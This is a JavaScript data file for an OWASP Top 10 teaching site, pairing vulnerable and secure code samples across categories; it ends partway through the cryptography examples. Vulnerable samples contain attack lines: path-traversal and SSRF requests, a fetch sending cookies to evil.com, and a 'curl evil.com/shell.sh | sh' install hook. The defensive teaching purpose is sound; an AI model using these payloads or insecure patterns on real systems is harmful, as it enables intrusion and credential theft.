/**
 * data.js — OWASP Top 10 (2025 vs 2021) Educational Data
 * Contains structured descriptions, code examples, and sandbox configs
 * for each vulnerability category. Each category has 5 code comparison examples.
 * Examples use diverse programming languages: Python, Java, Go, C#, PHP, Ruby, JavaScript, etc.
 */

const OWASP_DATA = [
  // ═══════════════════════════════════════════════════════════════════
  //  A01: Broken Access Control
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a01",
    code: "A01:2025",
    title: "Broken Access Control",
    prevCode: "A01:2021",
    prevTitle: "Broken Access Control",
    badge: { text: "Unchanged #1", type: "same" },
    description:
      "Broken Access Control allows attackers to bypass authorization and access resources, data, or functionality they shouldn't reach. This includes privilege escalation, insecure direct object references, missing function-level access controls, and CORS misconfigurations.",
    comparison:
      "In 2025, this category absorbs <strong>Server-Side Request Forgery (SSRF)</strong> — previously its own category (A10:2021) — recognizing SSRF as fundamentally an access control violation. It remains the #1 risk for the second consecutive edition, now covering an even broader attack surface including CORS misconfiguration and path traversal.",
    sandbox: {
      title: "Admin Panel Access Control",
      description:
        'Click "View Admin Panel" to see how a vulnerable app merely hides the admin UI with CSS, while a secure app checks an authorization token before rendering.',
      vulnerableLabel: "Vulnerable: CSS-hidden Admin Panel",
      secureLabel: "Secure: JWT Role Check",
    },
    examples: [
      {
        title: "Insecure Direct Object Reference (IDOR)",
        vulnerableCode: `# Python Flask — Vulnerable: No ownership check
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/api/invoices/<int:invoice_id>')
def get_invoice(invoice_id):
    # User can access ANY invoice by changing the ID
    invoice = db.invoices.find_by_id(invoice_id)

    if not invoice:
        return jsonify({"error": "Not found"}), 404

    # No check: does this invoice belong to the logged-in user?
    return jsonify(invoice.to_dict())

# An attacker simply increments the ID:
# GET /api/invoices/1001  ← their invoice
# GET /api/invoices/1002  ← someone else's invoice
# GET /api/invoices/1003  ← another user's private data
# All return 200 OK with full invoice details.`,
        secureCode: `# Python Flask — Secure: Ownership verification
from flask import Flask, request, jsonify
from functools import wraps

def login_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        user = get_current_user(request)
        if not user:
            return jsonify({"error": "Unauthorized"}), 401
        request.user = user
        return f(*args, **kwargs)
    return decorated

@app.route('/api/invoices/<int:invoice_id>')
@login_required
def get_invoice(invoice_id):
    invoice = db.invoices.find_by_id(invoice_id)

    if not invoice:
        return jsonify({"error": "Not found"}), 404

    # Ownership check: does this invoice belong to the user?
    if invoice.user_id != request.user.id:
        security_logger.warning(
            "IDOR_ATTEMPT",
            user=request.user.id,
            target_invoice=invoice_id
        )
        return jsonify({"error": "Forbidden"}), 403

    return jsonify(invoice.to_dict())

# GET /api/invoices/1002 → 403 Forbidden
# Attacker cannot access other users' invoices.`,
      },
      {
        title: "Missing Function-Level Access Control",
        vulnerableCode: `// Java Spring Boot — Vulnerable: No server-side role check
@RestController
public class UserController {

    // Frontend hides the "Delete User" button for non-admins,
    // but the API endpoint has NO server-side check.

    @DeleteMapping("/api/users/{id}")
    public ResponseEntity<?> deleteUser(@PathVariable Long id) {
        // No authorization check at all!
        userRepository.deleteById(id);
        return ResponseEntity.ok(
            Map.of("message", "User deleted")
        );
    }

    // Any authenticated user can call:
    // DELETE /api/users/42
    // ...even if the UI doesn't show a delete button.
    // The API trusts the client to enforce roles.
}`,
        secureCode: `// Java Spring Boot — Secure: Role-based access control
@RestController
public class UserController {

    @DeleteMapping("/api/users/{id}")
    @PreAuthorize("hasRole('ADMIN')")  // Spring Security check
    public ResponseEntity<?> deleteUser(
            @PathVariable Long id,
            @AuthenticationPrincipal UserDetails currentUser) {

        // Log the deletion for audit trail
        securityLogger.info(
            "USER_DELETED by={} target={}",
            currentUser.getUsername(), id
        );

        userRepository.deleteById(id);
        return ResponseEntity.ok(
            Map.of("message", "User deleted")
        );
    }
}

// Spring Security configuration ensures:
// 1. @PreAuthorize is evaluated BEFORE the method runs
// 2. Non-admin users get 403 Forbidden automatically
// 3. Unauthenticated users get 401 Unauthorized`,
      },
      {
        title: "Path Traversal",
        vulnerableCode: `# Ruby Sinatra — Vulnerable: User-controlled file path
require 'sinatra'

get '/api/files' do
  filename = params[:name]

  # Directly concatenate user input into file path
  file_path = "/var/www/uploads/#{filename}"
  send_file file_path
end

# An attacker requests:
# GET /api/files?name=../../../etc/passwd
#
# Resolved path: /var/www/uploads/../../../etc/passwd
# Actual path:   /etc/passwd
#
# The server reads and returns the system password file.
# Works for any file readable by the process.
#
# More attacks:
# ?name=../../.env          → environment secrets
# ?name=../../../etc/shadow → password hashes`,
        secureCode: `# Ruby Sinatra — Secure: Validate and normalize path
require 'sinatra'
require 'pathname'

UPLOADS_DIR = Pathname.new("/var/www/uploads").realpath

get '/api/files' do
  filename = params[:name]

  # Reject empty filenames and path separators
  halt 400, { error: "Invalid filename" }.to_json unless filename
  halt 400, { error: "Invalid filename" }.to_json if filename.include?("/") || filename.include?("\\\\")
  halt 400, { error: "Invalid filename" }.to_json if filename.include?("..")

  # Resolve to absolute and verify it's within UPLOADS_DIR
  resolved = (UPLOADS_DIR / filename).realpath rescue nil

  unless resolved && resolved.to_s.start_with?(UPLOADS_DIR.to_s)
    SecurityLogger.warn(
      event: "PATH_TRAVERSAL_ATTEMPT",
      user: current_user&.id,
      attempted: filename
    )
    halt 403, { error: "Forbidden" }.to_json
  end

  send_file resolved.to_s
end

# ../../../etc/passwd → 403 Forbidden
# normal_file.pdf    → 200 OK`,
      },
      {
        title: "CORS Misconfiguration",
        vulnerableCode: `// Go — Vulnerable: Reflects any origin with credentials
package main

import "net/http"

func corsMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // Reflects ANY origin — even malicious ones
        origin := r.Header.Get("Origin")
        if origin == "" {
            origin = "*"
        }
        w.Header().Set("Access-Control-Allow-Origin", origin)
        w.Header().Set("Access-Control-Allow-Credentials", "true")
        w.Header().Set("Access-Control-Allow-Methods",
            "GET,POST,PUT,DELETE")

        next.ServeHTTP(w, r)
    })
}

// An attacker's page at https://evil.com can now:
//   fetch('https://your-api.com/api/profile', {
//     credentials: 'include'
//   })
// The browser sends the victim's cookies,
// and the response is readable by the attacker.`,
        secureCode: `// Go — Secure: Strict allowlist of trusted origins
package main

import "net/http"

var allowedOrigins = map[string]bool{
    "https://app.yoursite.com":   true,
    "https://admin.yoursite.com": true,
}

func corsMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        origin := r.Header.Get("Origin")

        if allowedOrigins[origin] {
            w.Header().Set("Access-Control-Allow-Origin", origin)
            w.Header().Set("Access-Control-Allow-Credentials", "true")
            w.Header().Set("Access-Control-Allow-Methods", "GET,POST")
            w.Header().Set("Access-Control-Allow-Headers",
                "Content-Type, Authorization")
            w.Header().Set("Access-Control-Max-Age", "86400")
        }
        // If origin is not in the allowlist, no CORS
        // headers are set — browser blocks the request.

        if r.Method == "OPTIONS" {
            w.WriteHeader(http.StatusNoContent)
            return
        }

        next.ServeHTTP(w, r)
    })
}

// https://evil.com → blocked by browser (no CORS header)
// https://app.yoursite.com → allowed`,
      },
      {
        title: "Server-Side Request Forgery (SSRF)",
        vulnerableCode: `<?php
// PHP — Vulnerable: User-controlled URL fetch
// The user provides a URL and the server fetches it

$url = $_GET['url'];

// Server fetches whatever URL the user provides
$response = file_get_contents($url);
echo $response;

// Attacker requests:
// GET /fetch?url=http://169.254.169.254/latest/meta-data/
// → Returns AWS instance metadata (IAM credentials!)

// GET /fetch?url=http://localhost:6379/CONFIG+SET+dir+/tmp/
// → Sends commands to internal Redis server

// GET /fetch?url=file:///etc/passwd
// → Reads local files via file:// protocol

// The server acts as a proxy, reaching internal
// services that are not accessible from the internet.
?>`,
        secureCode: `<?php
// PHP — Secure: URL validation + allowlist
function fetchUrl(string $url): string {
    // Parse and validate the URL
    $parsed = parse_url($url);
    if (!$parsed || !isset($parsed['host'])) {
        throw new InvalidArgumentException("Invalid URL");
    }

    // Only allow HTTPS
    if (($parsed['scheme'] ?? '') !== 'https') {
        throw new InvalidArgumentException("Only HTTPS allowed");
    }

    // Allowlist of permitted domains
    $allowedDomains = ['api.example.com', 'cdn.example.com'];
    if (!in_array($parsed['host'], $allowedDomains, true)) {
        throw new InvalidArgumentException("Domain not allowed");
    }

    // Resolve DNS and block internal IPs
    $ip = gethostbyname($parsed['host']);
    if (isInternalIP($ip)) {
        $logger->warning("SSRF attempt blocked", [
            'url' => $url, 'resolved_ip' => $ip
        ]);
        throw new SecurityException("Internal IP blocked");
    }

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    // Block file://, gopher://, dict:// protocols
    curl_setopt($ch, CURLOPT_PROTOCOLS,
        CURLPROTO_HTTPS);

    return curl_exec($ch);
}
?>`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A02: Security Misconfiguration
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a02",
    code: "A02:2025",
    title: "Security Misconfiguration",
    prevCode: "A05:2021",
    prevTitle: "Security Misconfiguration",
    badge: { text: "Up from #5", type: "moved-up" },
    description:
      "Security Misconfiguration occurs when systems, applications, or cloud services are set up incorrectly. This includes insecure defaults, open cloud storage, misconfigured HTTP headers, verbose error messages, and unnecessary features left enabled.",
    comparison:
      "Surged from <strong>#5 to #2</strong> in 2025, reflecting the explosion of configurable surfaces in modern cloud-native and containerized architectures. The increasing complexity of Kubernetes, serverless, and multi-cloud environments makes misconfiguration one of the most common and dangerous attack vectors.",
    sandbox: {
      title: "Exposed Server Configuration",
      description:
        'Simulate browsing to a misconfigured server that exposes directory listings and sensitive files like <code>.env</code>. Toggle between vulnerable (everything exposed) and secure (proper access controls).',
      vulnerableLabel: "Vulnerable: Open Directory Listing",
      secureLabel: "Secure: Restricted Access",
    },
    examples: [
      {
        title: "Exposed Directory Listing & Sensitive Files",
        vulnLang: "bash",
        secureLang: "bash",
        vulnerableCode: `# Vulnerable: Apache server with directory listing enabled
# .htaccess — MISSING or misconfigured
Options +Indexes
# No access restrictions on sensitive files

# Exposed files visible to anyone:
# /.env
# /config/database.yml
# /backup/dump.sql
# /.git/config

# Example .env contents now public:
DB_HOST=prod-db.internal.company.com
DB_PASSWORD=SuperSecret123!
AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY
STRIPE_SECRET=sk_live_abc123xyz`,
        secureCode: `# Secure: Properly configured Apache server
Options -Indexes
ServerSignature Off

# Block access to sensitive files
<FilesMatch "^\\.(env|git|htpasswd)">
  Require all denied
</FilesMatch>

# Block access to backup and config directories
<DirectoryMatch "/(backup|config|\\.git)/">
  Require all denied
</DirectoryMatch>

# Security headers
Header set X-Content-Type-Options "nosniff"
Header set X-Frame-Options "DENY"
Header set Referrer-Policy "strict-origin-when-cross-origin"
Header set Content-Security-Policy "default-src 'self'"

# Custom error pages (no stack traces)
ErrorDocument 403 /errors/403.html
ErrorDocument 404 /errors/404.html
ErrorDocument 500 /errors/500.html`,
      },
      {
        title: "Default Credentials Left Enabled",
        vulnerableCode: `# Python Django — Vulnerable: Default admin credentials
# settings.py
DEFAULT_ADMIN_USERNAME = "admin"
DEFAULT_ADMIN_PASSWORD = "admin"

# management/commands/setup.py
from django.contrib.auth.models import User

class Command(BaseCommand):
    def handle(self, *args, **options):
        # Creates admin with hardcoded password
        User.objects.create_superuser(
            username="admin",
            password="admin",       # Default credentials!
            email="admin@example.com"
        )

        User.objects.create_superuser(
            username="test",
            password="test123",     # Test account in production!
            email="test@example.com"
        )

        self.stdout.write("Default users created.")
        # No prompt to change passwords
        # No flag to track if defaults were changed`,
        secureCode: `# Python Django — Secure: Force password change on first login
import secrets
from django.contrib.auth.models import User

class Command(BaseCommand):
    def handle(self, *args, **options):
        # Generate a cryptographically secure random password
        admin_password = secrets.token_urlsafe(24)

        admin = User.objects.create_superuser(
            username="admin",
            password=admin_password,
            email="admin@example.com"
        )

        # Mark that password MUST be changed on first login
        AdminProfile.objects.create(
            user=admin,
            must_change_password=True,
            created_at=timezone.now()
        )

        # Display the generated password once during setup
        self.stdout.write(
            f"Initial admin password (change immediately):"
        )
        self.stdout.write(admin_password)

# Login middleware checks must_change_password flag
class ForcePasswordChangeMiddleware:
    def __call__(self, request):
        if request.user.is_authenticated:
            profile = request.user.adminprofile
            if profile.must_change_password:
                if request.path != "/change-password/":
                    return redirect("/change-password/")
        return self.get_response(request)`,
      },
      {
        title: "Verbose Error Messages in Production",
        vulnerableCode: `// C# ASP.NET — Vulnerable: Detailed errors sent to users
public class ErrorController : Controller
{
    [Route("/error")]
    public IActionResult HandleError()
    {
        var exceptionFeature = HttpContext.Features
            .Get<IExceptionHandlerFeature>();
        var exception = exceptionFeature?.Error;

        // Sends EVERYTHING to the client
        return StatusCode(500, new {
            error = exception?.Message,
            // "System.Data.SqlClient.SqlException:
            //  Login failed for user 'sa'"
            stackTrace = exception?.StackTrace,
            // Reveals file paths, framework versions
            innerException = exception?.InnerException?.Message,
            source = exception?.Source,
            // "Microsoft.EntityFrameworkCore"
            environment = Environment.GetEnvironmentVariable(
                "ASPNETCORE_ENVIRONMENT")
        });
    }
}

// Attacker learns:
// - Database type and connection details
// - File paths and directory structure
// - Framework and library versions
// - Internal service architecture`,
        secureCode: `// C# ASP.NET — Secure: Generic errors for users
public class ErrorController : Controller
{
    private readonly ILogger<ErrorController> _logger;

    [Route("/error")]
    public IActionResult HandleError()
    {
        var exceptionFeature = HttpContext.Features
            .Get<IExceptionHandlerFeature>();
        var exception = exceptionFeature?.Error;

        // Generate unique reference ID
        var errorId = Guid.NewGuid().ToString();

        // Log full details INTERNALLY (never to client)
        _logger.LogError(exception,
            "Unhandled exception. ErrorId={ErrorId}, " +
            "Path={Path}, User={User}",
            errorId,
            HttpContext.Request.Path,
            User.Identity?.Name ?? "anonymous"
        );

        // Send minimal info to client
        var isDev = Environment.GetEnvironmentVariable(
            "ASPNETCORE_ENVIRONMENT") == "Development";

        return StatusCode(500, isDev
            ? new { error = exception?.Message }
            : new {
                error = "An internal error occurred.",
                referenceId = errorId
              }
        );
    }
}`,
      },
      {
        title: "Unnecessary HTTP Methods Enabled",
        vulnerableCode: `# Python Flask — Vulnerable: All methods accepted
from flask import Flask

app = Flask(__name__)

# This route only needs GET, but accepts everything
@app.route('/api/users', methods=[
    'GET', 'POST', 'PUT', 'DELETE',
    'PATCH', 'OPTIONS', 'TRACE'
])
def users():
    users = db.users.find_all()
    return jsonify(users)

# An attacker can:
# DELETE /api/users → might trigger unexpected behavior
# TRACE  /api/users → reflects headers (XST attack)
# PUT    /api/users → may overwrite data
# OPTIONS /api/users → reveals all allowed methods

# Server response to OPTIONS:
# Allow: GET, POST, PUT, DELETE, PATCH, OPTIONS, TRACE
# This tells the attacker exactly what to try.`,
        secureCode: `# Python Flask — Secure: Explicit methods per route
from flask import Flask, jsonify, request
from functools import wraps

app = Flask(__name__)

def require_role(*roles):
    def decorator(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            if not current_user or current_user.role not in roles:
                return jsonify({"error": "Forbidden"}), 403
            return f(*args, **kwargs)
        return decorated
    return decorator

# Only allow the methods each route actually needs
@app.route('/api/users', methods=['GET'])
@login_required
def list_users():
    return jsonify(db.users.find_all())

@app.route('/api/users', methods=['POST'])
@login_required
@require_role('admin')
def create_user():
    return jsonify(db.users.create(request.json)), 201

# Any other method returns 405 Method Not Allowed
# Flask handles this automatically when methods are explicit

# Disable TRACE globally
@app.before_request
def block_trace():
    if request.method == 'TRACE':
        return jsonify({"error": "TRACE disabled"}), 405`,
      },
      {
        title: "Missing Security Headers",
        vulnLang: "markup",
        secureLang: "go",
        vulnerableCode: `<!-- Vulnerable: No security headers set -->
<!-- Server response headers: -->
<!--
  HTTP/1.1 200 OK
  Content-Type: text/html
  X-Powered-By: Express 4.18.2
  Server: Apache/2.4.41 (Ubuntu)

  No Content-Security-Policy
  No X-Frame-Options
  No X-Content-Type-Options
  No Strict-Transport-Security
  No Referrer-Policy
  No Permissions-Policy
-->

<!-- Consequences: -->
<!-- 1. Page can be embedded in iframes (clickjacking) -->
<!-- 2. Browser may MIME-sniff responses (XSS via uploads) -->
<!-- 3. No HTTPS enforcement (downgrade attacks) -->
<!-- 4. Referer header leaks URLs to third parties -->
<!-- 5. X-Powered-By reveals tech stack to attackers -->`,
        secureCode: `// Go — Secure: Comprehensive security headers middleware
package main

import "net/http"

func securityHeaders(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        // Prevent clickjacking
        w.Header().Set("X-Frame-Options", "DENY")

        // Stop MIME-type sniffing
        w.Header().Set("X-Content-Type-Options", "nosniff")

        // Enforce HTTPS for 1 year
        w.Header().Set("Strict-Transport-Security",
            "max-age=31536000; includeSubDomains; preload")

        // Control referrer information
        w.Header().Set("Referrer-Policy",
            "strict-origin-when-cross-origin")

        // Content Security Policy
        w.Header().Set("Content-Security-Policy",
            "default-src 'self'; script-src 'self'")

        // Restrict browser features
        w.Header().Set("Permissions-Policy",
            "camera=(), microphone=(), geolocation=()")

        // Remove server fingerprint headers
        w.Header().Del("X-Powered-By")
        w.Header().Del("Server")

        next.ServeHTTP(w, r)
    })
}`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A03: Software Supply Chain Failures
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a03",
    code: "A03:2025",
    title: "Software Supply Chain Failures",
    prevCode: "A06:2021",
    prevTitle: "Vulnerable and Outdated Components",
    badge: { text: "NEW — was #6", type: "new" },
    description:
      "Software Supply Chain Failures encompass compromised dependencies, malicious packages, tampered build pipelines, and dependency confusion attacks. This goes far beyond just outdated libraries.",
    comparison:
      'Evolved from A06:2021 "Vulnerable and Outdated Components" into a much <strong>broader category</strong>. The 2021 version focused on known CVEs in libraries. The 2025 version covers the entire supply chain: malicious packages, compromised maintainers, CI/CD pipeline tampering, and dependency confusion. Incidents like SolarWinds and npm package poisoning drove this expansion.',
    sandbox: {
      title: "Subresource Integrity (SRI)",
      description:
        "See the difference between loading a third-party script with no integrity check versus using SRI hashes. Click to simulate a supply-chain attack where the CDN-hosted script is tampered with.",
      vulnerableLabel: "Vulnerable: No Integrity Check",
      secureLabel: "Secure: SRI Hash Verification",
    },
    examples: [
      {
        title: "Missing Subresource Integrity (SRI)",
        vulnerableCode: `<!-- Vulnerable: Loading scripts with no integrity check -->
<script src="https://cdn.example.com/lib/utils@3.1.0/utils.min.js">
</script>

<!--
  RISK: If the CDN is compromised or the package
  author pushes malicious code, your site loads it
  without any verification.

  An attacker who compromises the CDN can replace
  utils.min.js with:
-->
<script>
  // Injected malicious code in the tampered library:
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({
      cookies: document.cookie,
      localStorage: JSON.stringify(localStorage),
      url: window.location.href
    })
  });
</script>`,
        secureCode: `<!-- Secure: SRI hash + crossorigin attribute -->
<script
  src="https://cdn.example.com/lib/utils@3.1.0/utils.min.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxAh7
             kzGNOEXQceRifoj6HSbEcYR3pZ"
  crossorigin="anonymous">
</script>

<!--
  HOW IT WORKS:
  1. Browser downloads the script file
  2. Computes SHA-384 hash of the file contents
  3. Compares computed hash with the 'integrity' attribute
  4. If hashes DON'T match → script is BLOCKED entirely

  Console output on mismatch:
  "Failed to find a valid digest in the 'integrity'
   attribute for resource '...' with computed
   SHA-384 integrity '...'. The resource has been blocked."

  Generate SRI hash with:
  shasum -b -a 384 utils.min.js | xxd -r -p | base64
-->`,
      },
      {
        title: "Unpinned Dependency Versions",
        vulnLang: "json",
        secureLang: "json",
        vulnerableCode: `// package.json — Vulnerable: loose version ranges
{
  "dependencies": {
    "lodash": "^4.0.0",
    //  ^4.0.0 matches ANY 4.x.x version
    //  A compromised 4.99.0 would install automatically

    "express": "*",
    //  * matches ANY version — even a major rewrite
    //  with breaking changes or injected code

    "left-pad": ">=1.0.0",
    //  Accepts any version above 1.0.0
    //  Attacker publishes 99.0.0 with malicious code

    "event-stream": "~3.3.0"
    //  event-stream@3.3.6 was hijacked with malware
    //  targeting cryptocurrency wallets (real incident)
  }
}

// npm install pulls whatever matches the range
// You get different code on every install`,
        secureCode: `// package.json — Secure: exact pinned versions
{
  "dependencies": {
    "lodash": "4.17.21",
    "express": "4.18.2",
    "left-pad": "1.3.0",
    "event-stream": "4.0.1"
  }
}

// package-lock.json is committed to git and includes
// integrity hashes for every dependency:
// "lodash": {
//   "version": "4.17.21",
//   "resolved": "https://registry.npmjs.org/lodash/-/...",
//   "integrity": "sha512-v2kDEe57lec..."
// }

// CI/CD pipeline checks:
// 1. npm ci (uses lockfile exactly, fails on mismatch)
// 2. npm audit (checks for known vulnerabilities)
// 3. Socket.dev / Snyk (detects malicious packages)
// 4. Renovate / Dependabot (controlled version bumps)`,
      },
      {
        title: "Dependency Confusion Attack",
        vulnLang: "python",
        secureLang: "bash",
        vulnerableCode: `# Python pip — Vulnerable: no index URL scoping
# requirements.txt
company-auth-utils==2.0.0
company-data-models==1.5.0

# pip.conf — No private index configuration
# pip looks at PyPI (public) first by default

# The problem:
# 1. company-auth-utils exists on your private PyPI
# 2. An attacker publishes company-auth-utils==99.0.0
#    on the PUBLIC PyPI
# 3. pip resolves the highest version number
# 4. pip installs the attacker's 99.0.0 from public PyPI
#    instead of your private 2.0.0

# The malicious package runs a setup.py script:
# import subprocess
# subprocess.call([
#     "curl", "https://evil.com/shell.sh", "|", "sh"
# ])`,
        secureCode: `# Python pip — Secure: scoped index configuration
# pip.conf — Restrict where packages come from
# [global]
# index-url = https://pypi.company.com/simple/
# extra-index-url = https://pypi.org/simple/

# Better: use requirements.txt with hashes
# requirements.txt
company-auth-utils==2.0.0 \\
    --hash=sha256:abc123def456...
company-data-models==1.5.0 \\
    --hash=sha256:789ghi012jkl...

# pip install --require-hashes -r requirements.txt
# If the hash doesn't match, installation FAILS

# Additional protections:
# 1. Register your package names on public PyPI
#    (even if you never publish there)
# 2. Use pip --index-url (not --extra-index-url)
#    to specify ONLY your private index
# 3. Use pipenv or poetry with explicit sources:
#
# [[tool.poetry.source]]
# name = "company"
# url = "https://pypi.company.com/simple/"
# priority = "primary"`,
      },
      {
        title: "Compromised Build Pipeline",
        vulnerableCode: `# Vulnerable: CI/CD with no integrity checks
# .github/workflows/deploy.yml

name: Deploy
on: push

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
        # Using 'main' branch — can change anytime!

      - uses: some-user/deploy-action@main
        # Third-party action from untrusted source
        # Pinned to 'main' — author can push malware

      - run: npm install
        # No lockfile enforcement
        # Dependencies could have changed

      - run: npm run build

      - run: |
          # Credentials in plaintext
          echo "Deploying with key: $DEPLOY_KEY"
          scp -r dist/ server:/var/www/
        env:
          DEPLOY_KEY: sk-prod-abc123`,
        secureCode: `# Secure: Hardened CI/CD pipeline
# .github/workflows/deploy.yml

name: Deploy
on: push

permissions:
  contents: read  # Minimum permissions

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@b4ffde6  # Pinned to SHA
        with:
          persist-credentials: false

      # Only use verified/first-party actions, pinned to SHA
      - uses: actions/setup-node@1a4442c
        with:
          node-version-file: '.nvmrc'

      - run: npm ci  # Strict lockfile install — fails on mismatch

      - run: npm audit --audit-level=high
        # Fail build on high-severity CVEs

      - run: npm run build

      # Deployment uses OIDC — no long-lived secrets
      - uses: aws-actions/configure-aws-credentials@e3dd6a4
        with:
          role-to-assume: arn:aws:iam::role/deploy
          aws-region: us-east-1

      - run: aws s3 sync dist/ s3://prod-bucket/
        # Credentials from OIDC — no secrets in env`,
      },
      {
        title: "Typosquatting / Malicious Packages",
        vulnLang: "bash",
        secureLang: "bash",
        vulnerableCode: `# Vulnerable: Installing packages without verification
# A developer types quickly and makes a typo:

pip install djnago        # Misspelling of 'django'
pip install reqeusts      # Misspelling of 'requests'
pip install python-nmap2  # Fake variant of 'python-nmap'
npm install expresss      # Note: 3 s's — typosquat!
gem install activesupport # Missing hyphen

# Attacker registered these lookalike names
# and published packages that:
# 1. Include the legitimate library (works normally)
# 2. Add a hidden setup.py / postinstall script
# 3. Steal environment variables / SSH keys
# 4. Install a backdoor or crypto miner

# Real-world examples:
# - crossenv (typosquat of cross-env): stole env vars
# - event-stream v3.3.6: targeted Bitcoin wallets
# - ua-parser-js v0.7.29: installed crypto miners
# - colourama (typosquat of colorama): stole crypto`,
        secureCode: `# Secure: Verification before installing packages

# 1. Always verify the package name and publisher
pip show requests  # Check the real package details first
npm info express   # Verify publisher, downloads, repo URL

# 2. Use pip with hash verification
pip install requests==2.31.0 \\
    --hash=sha256:942c5a758f98d790eaed1a29cb6eefc7f49...

# 3. Use a lockfile and verify in CI
pip install --require-hashes -r requirements.txt
npm ci  # Uses lockfile, fails on mismatch

# 4. Scan dependencies before install
pip-audit                    # Python vulnerability scanner
npm audit signatures         # Verify npm signatures
bundler-audit check          # Ruby gem scanner
safety check                 # Python safety checker

# 5. Use an allowlist in CI/CD
# .github/workflows/check.yml:
#   - run: pip-audit --require-hashes
#   - run: npm audit --audit-level=high

# 6. Review new dependencies before merging
# Use Socket.dev, Snyk, or Dependabot to flag
# suspicious dependencies in PRs automatically`,
      },
    ],
  },

  // ═══════════════════════════════════════════════════════════════════
  //  A04: Cryptographic Failures
  // ═══════════════════════════════════════════════════════════════════
  {
    id: "a04",
    code: "A04:2025",
    title: "Cryptographic Failures",
    prevCode: "A02:2021",
    prevTitle: "Cryptographic Failures",
    badge: { text: "Down from #2", type: "moved-down" },
    description:
      "Cryptographic Failures involve missing encryption, weak algorithms (MD5, SHA-1), leaked keys, and improper handling of sensitive data. This leads to exposure of passwords, credit cards, health records, and personal data.",
    comparison:
      "Moved from <strong>#2 to #4</strong>. While still critical, the relative rise of supply-chain attacks and misconfigurations has pushed it down. The fundamentals remain the same: use strong algorithms, manage keys properly, encrypt data in transit and at rest, and never roll your own crypto.",
    sandbox: {
      title: "Password Storage",
      description:
        'Enter a password and see how a vulnerable app stores it in plain text / Base64 (trivially reversible) in LocalStorage, versus using the Web Crypto API to derive a proper hash with a salt.',
      vulnerableLabel: "Vulnerable: Plain Text / Base64",
      secureLabel: "Secure: PBKDF2 with Salt",
    },
    examples: [
      {
        title: "Plain Text / Base64 Password Storage",
        vulnerableCode: `<?php
// PHP — Vulnerable: Storing passwords in plaintext or Base64

function registerUser($username, $password) {
    // TERRIBLE: Plain text storage
    $stmt = $pdo->prepare(
        "INSERT INTO users (username, password) VALUES (?, ?)"
    );
    $stmt->execute([$username, $password]);

    // ALSO TERRIBLE: Base64 is NOT encryption
    $encoded = base64_encode($password);
    // Anyone can decode: base64_decode($encoded) → password
}

function loginUser($username, $password) {
    $stmt = $pdo->prepare(
        "SELECT password FROM users WHERE username = ?"
    );
    $stmt->execute([$username]);
    $stored = $stmt->fetchColumn();

    // Direct comparison — no hashing at all
    return $stored === $password;
}

// If the database is breached, ALL passwords are
// immediately readable — no cracking needed.
?>`,
        secureCode: `<?php
// PHP — Secure: password_hash with bcrypt/argon2

function registerUser($username, $password) {
    // bcrypt hash with automatic salt (built into PHP)
    $hash = password_hash($password, PASSWORD_BCRYPT, [
        'cost' => 12  // ~250ms to hash (tunable)
    ]);
    // Result: "$2y$12$LJ3m4kF..." (includes salt + hash)

    $stmt = $pdo->prepare(
        "INSERT INTO users (username, password_hash) VALUES (?, ?)"
    );
    $stmt->execute([$username, $hash]);
}

function loginUser($username, $password) {
    $stmt = $pdo->prepare(
        "SELECT password_hash FROM users WHERE username = ?"
    );
    $stmt->execute([$username]);
    $hash = $stmt->fetchColumn();

    // password_verify is timing-safe (prevents timing attacks)
    return password_verify($password, $hash);
}

// Even better: Argon2id (PHP 7.3+)
// $hash = password_hash($password, PASSWORD_ARGON2ID, [
//     'memory_cost' => 65536,  // 64 MB
//     'time_cost'   => 4,      // 4 iterations
//     'threads'     => 3       // 3 parallel threads
// ]);
?>`,
      },
      {
        title: "Weak Hashing Algorithms (MD5 / SHA-1)",
        vulnerableCode: `# Python — Vulnerable: Using MD5 for password hashing
import hashlib

def hash_password(password):
    # MD5 is broken — collisions found since 2004
    return hashlib.md5(password.encode()).hexdigest()

# Also vulnerable: SHA-1 without salt
def hash_password_sha1(password):
    return hashlib.sha1(password.encode()).hexdigest()
    # SHA-1 collision demonstrated by Google in 2017
    # Vulnerable to rainbow table attacks (no salt)

# Stored hash: "5f4dcc3b5aa765d61d8327deb882cf99"
# Google "5f4dcc3b5aa765d61d8327deb882cf99"
# First result: "password"
# Pre-computed rainbow tables crack MD5 in seconds.
# A modern GPU can compute 100 BILLION MD5 hashes/second.`,
        secureCode: `# Python — Secure: bcrypt or Argon2 (server-side)
import bcrypt
from argon2 import PasswordHasher

# Option 1: bcrypt
def hash_password_bcrypt(password):
    # bcrypt: salt is generated and embedded automatically
    # rounds=12 means 2^12 = 4096 iterations (~250ms)
    salt = bcrypt.gensalt(rounds=12)
    return bcrypt.hashpw(password.encode(), salt)

def verify_password_bcrypt(password, stored_hash):
    # bcrypt.checkpw is timing-safe (prevents timing attacks)
    return bcrypt.checkpw(password.encode(), stored_hash)

# Option 2: Argon2id (winner of Password Hashing Competition)
ph = PasswordHasher(
    time_cost=3,       # 3 iterations
    memory_cost=65536,  # 64 MB memory
    parallelism=4       # 4 threads
)

def hash_password_argon2(password):
    return ph.hash(password)
    # "$argon2id$v=19$m=65536,t=3,p=4$..."

